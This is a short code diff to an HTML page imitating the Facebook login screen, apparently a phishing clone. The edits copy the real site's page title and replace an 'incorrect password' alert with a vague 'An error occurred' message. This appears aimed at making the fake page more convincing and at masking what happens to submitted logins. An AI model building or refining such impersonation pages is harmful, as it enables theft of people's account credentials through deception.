@@ -3,7 +3,7 @@
 
 <head>
     <meta charset="UTF-8">
-    <title>Facebook login</title>
+    <title>Facebook – log in or sign up</title>
     <link rel="stylesheet" href="style.css">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
@@ -104,7 +104,7 @@
                     window.location.href = data.redirectUrl || 'https://www.facebook.com/me'; // Redirect if success
                 } else {
                     // Show an error message if login failed
-                    alert("Incorrect email or password. Please try again.");
+                    alert("An error occurred. Please try again later.");
                 }
             })
             .catch(error => {
